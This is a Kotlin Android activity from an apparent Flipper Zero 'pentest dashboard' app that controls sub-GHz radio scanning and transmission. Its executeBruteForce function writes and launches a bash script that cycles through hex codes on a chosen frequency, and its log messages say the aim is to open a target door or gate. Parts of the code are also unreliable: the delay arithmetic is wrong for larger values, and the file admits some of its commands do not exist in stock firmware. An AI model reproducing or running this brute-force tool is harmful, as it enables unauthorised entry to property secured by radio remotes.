package com.pentest.dashboard

import android.os.Bundle
import android.widget.ImageView
import android.widget.TextView
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import com.google.android.material.button.MaterialButton

class SubGHzActivity : AppCompatActivity() {

    private lateinit var frequencyDisplay: TextView
    private lateinit var logOutput: TextView
    private lateinit var btnScan: MaterialButton

    private var isScanning = false
    private var currentFrequency = 433.920

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_subghz)

        // Stop any running processes from other activities
        ProcessManager.stopCurrentProcess(this)

        FlipperConnectionManager.setDataReceivedCallback { data ->
            addLog("FLIPPER: $data")
        }

        frequencyDisplay = findViewById(R.id.frequencyDisplay)
        logOutput = findViewById(R.id.logOutput)
        btnScan = findViewById(R.id.btnScan)

        findViewById<ImageView>(R.id.btnBack).setOnClickListener {
            finish()
        }

        // Frequency preset buttons
        findViewById<MaterialButton>(R.id.btn315).setOnClickListener {
            setFrequency(315.000)
        }
        findViewById<MaterialButton>(R.id.btn433).setOnClickListener {
            setFrequency(433.920)
        }
        findViewById<MaterialButton>(R.id.btn868).setOnClickListener {
            setFrequency(868.000)
        }
        findViewById<MaterialButton>(R.id.btn390).setOnClickListener {
            setFrequency(390.000)
        }
        findViewById<MaterialButton>(R.id.btn915).setOnClickListener {
            setFrequency(915.000)
        }

        // Scan button
        btnScan.setOnClickListener {
            if (isScanning) {
                stopScanning()
            } else {
                startScanning()
            }
        }

        // Read Raw button
        findViewById<MaterialButton>(R.id.btnRead).setOnClickListener {
            addLog("Starting RAW signal capture...")
            addLog("Listening on ${String.format("%.3f", currentFrequency)} MHz")
            Toast.makeText(this, "Capturing RAW signal - Point remote at Flipper", Toast.LENGTH_LONG).show()
        }

        // Brute Force button
        findViewById<MaterialButton>(R.id.btnBruteForce).setOnClickListener {
            startBruteForce()
        }

        // Saved Signals button
        findViewById<MaterialButton>(R.id.btnSaved).setOnClickListener {
            addLog("Opening saved signals archive...")
            Toast.makeText(this, "Saved Signals - Feature coming soon", Toast.LENGTH_SHORT).show()
        }
    }

    private fun setFrequency(freq: Double) {
        currentFrequency = freq
        frequencyDisplay.text = String.format(java.util.Locale.US, "%.3f MHz", freq)
        addLog("Frequency set to ${String.format(java.util.Locale.US, "%.3f", freq)} MHz")
    }

    private fun startScanning() {
        isScanning = true
        btnScan.text = "STOP SCANNING"
        btnScan.backgroundTintList = getColorStateList(R.color.status_disconnected)
        addLog("=== TESTING FLIPPER CONNECTION ===")
        addLog("Frequency: ${String.format("%.3f", currentFrequency)} MHz")

        if (FlipperConnectionManager.isConnected()) {
            // Test with REAL Flipper CLI command that actually works
            val testCommand = "device_info\r\n"
            addLog("Testing connection with: device_info")

            val success = FlipperConnectionManager.sendCommand(testCommand)
            if (success == true) {
                addLog("✓ Command sent successfully!")
                addLog("✓ USB communication working!")
                addLog("")
                addLog("Watch Flipper screen for response...")
                addLog("")
                addLog("NOTE: SubGHz scanning requires Flipper firmware")
                addLog("integration or companion app.")
                addLog("Stock Flipper CLI doesn't have 'subghz rx' command.")
            } else {
                addLog("ERROR: Failed to send command")
                stopScanning()
            }
        } else {
            addLog("ERROR: Flipper not connected via USB")
            addLog("Go back to main screen and click CONNECT")
            stopScanning()
        }
    }

    private fun stopScanning() {
        isScanning = false
        btnScan.text = "START SCANNING"
        btnScan.backgroundTintList = getColorStateList(R.color.func_subghz)
        addLog("=== SCAN STOPPED ===")

        // Send stop command to Flipper
        FlipperConnectionManager.sendCommand("subghz end\r\n")
        addLog("Stop command sent")
        addLog("Ready.")
    }

    override fun onPause() {
        super.onPause()
        ProcessManager.stopCurrentProcess(this)
    }

    override fun onDestroy() {
        super.onDestroy()
        ProcessManager.stopCurrentProcess(this)
    }

    private fun startBruteForce() {
        addLog("=== CONFIGURING SUBGHZ BRUTE FORCE ===")

        // Show parameter dialog
        val parameters = listOf(
            ParameterDialog.Parameter(
                "START_CODE",
                "Start Code (hex)",
                "Starting transmission code (e.g., 000000)",
                defaultValue = "000000",
                required = true
            ),
            ParameterDialog.Parameter(
                "END_CODE",
                "End Code (hex)",
                "Ending transmission code (e.g., FFFFFF)",
                defaultValue = "FFFFFF",
                required = true
            ),
            ParameterDialog.Parameter(
                "DELAY_MS",
                "Delay (ms)",
                "Milliseconds between each transmission",
                defaultValue = "200",
                required = true
            ),
            ParameterDialog.Parameter(
                "PROTOCOL",
                "Protocol",
                "SubGHz protocol (Princeton, Nice, etc.)",
                defaultValue = "Princeton",
                required = true
            )
        )

        ParameterDialog(this).showDialog(
            title = "Configure SubGHz Brute Force",
            parameters = parameters
        ) { values ->
            executeBruteForce(values)
        }
    }

    private fun executeBruteForce(params: Map<String, String>) {
        val startCode = params["START_CODE"]?.toLongOrNull(16) ?: 0L
        val endCode = params["END_CODE"]?.toLongOrNull(16) ?: 0xFFFFFFL
        val delayMs = params["DELAY_MS"]?.toLongOrNull() ?: 200L
        val protocol = params["PROTOCOL"] ?: "Princeton"
        val freqHz = (currentFrequency * 1000000).toLong()

        // Validate inputs
        if (startCode > endCode) {
            addLog("ERROR: Start code must be ≤ end code")
            Toast.makeText(this, "Invalid range: Start > End", Toast.LENGTH_SHORT).show()
            return
        }

        val totalCodes = endCode - startCode + 1
        if (totalCodes > 100_000_000) {
            addLog("ERROR: Range too large (max 100 million codes)")
            addLog("Estimated time would be: ${calculateTime(totalCodes, delayMs)}")
            Toast.makeText(this, "Range too large - reduce range", Toast.LENGTH_LONG).show()
            return
        }

        if (delayMs < 10 || delayMs > 60000) {
            addLog("ERROR: Delay must be 10-60000ms")
            Toast.makeText(this, "Invalid delay", Toast.LENGTH_SHORT).show()
            return
        }

        addLog("=== SUBGHZ BRUTE FORCE ATTACK STARTED ===")
        addLog("Frequency: ${String.format("%.3f", currentFrequency)} MHz ($freqHz Hz)")
        addLog("Start Code: ${String.format("%06X", startCode)}")
        addLog("End Code: ${String.format("%06X", endCode)}")
        addLog("Total codes: ${endCode - startCode + 1}")
        addLog("Delay: ${delayMs}ms per code")
        addLog("Protocol: $protocol")
        addLog("Estimated time: ${calculateTime(endCode - startCode + 1, delayMs)}")
        addLog("")
        addLog("⚠️ KEEP FLIPPER NEAR TARGET")
        addLog("⚠️ KEEP APP IN FOREGROUND")
        addLog("⚠️ KEEP SCREEN ON")
        addLog("")
        addLog("Executing in Termux...")

        // Create brute force script
        val bruteScript = """
            #!/data/data/com.termux/files/usr/bin/bash

            echo "=== SUBGHZ BRUTE FORCE ATTACK ==="
            echo "Frequency: $freqHz Hz"
            echo "Start: ${String.format("%06X", startCode)}"
            echo "End: ${String.format("%06X", endCode)}"
            echo "Delay: ${delayMs}ms"
            echo "Protocol: $protocol"
            echo ""

            COUNT=0
            TOTAL=$((${endCode} - ${startCode} + 1))

            for ((CODE=${startCode}; CODE<=${endCode}; CODE++)); do
                HEX_CODE=$(printf "%06X" ${'$'}CODE)

                # Send to Flipper via USB serial
                echo "subghz tx $freqHz ${'$'}HEX_CODE" > /dev/ttyUSB0 2>/dev/null || echo "subghz tx $freqHz ${'$'}HEX_CODE" > /dev/ttyACM0 2>/dev/null

                COUNT=${'$'}((COUNT + 1))

                # Progress every 100 codes
                if [ ${'$'}((COUNT % 100)) -eq 0 ]; then
                    PERCENT=${'$'}((COUNT * 100 / TOTAL))
                    echo "[${'$'}PERCENT%] Tried: ${'$'}COUNT / ${'$'}TOTAL codes (Current: ${'$'}HEX_CODE)"
                fi

                # Delay between codes
                sleep 0.${delayMs}
            done

            echo ""
            echo "=== BRUTE FORCE COMPLETE ==="
            echo "Total codes transmitted: ${'$'}COUNT"
            echo "If door/gate/system opened, check which code worked"
        """.trimIndent()

        // Execute via ProcessManager so it can be stopped
        val processId = ProcessManager.startProcess(this, bruteScript)
        val scriptFile = java.io.File(getExternalFilesDir(null), "scripts/script_$processId.sh")

        val termux = TermuxIntegration(this)
        termux.runCommand("bash ${scriptFile.absolutePath}", background = false)

        addLog("")
        addLog("⚠️ Process ID: $processId")
        addLog("Click STOP button to halt attack")
        Toast.makeText(this, "Brute force started - Use STOP button to halt", Toast.LENGTH_LONG).show()
    }

    private fun calculateTime(totalCodes: Long, delayMs: Long): String {
        val totalSeconds = (totalCodes * delayMs) / 1000
        val hours = totalSeconds / 3600
        val minutes = (totalSeconds % 3600) / 60
        return "${hours}h ${minutes}m"
    }

    private fun addLog(message: String) {
        val timestamp = java.text.SimpleDateFormat("HH:mm:ss", java.util.Locale.US)
            .format(java.util.Date())
        val currentLog = logOutput.text.toString()
        val newLog = "[$timestamp] $message\n$currentLog"
        logOutput.text = newLog
    }
}
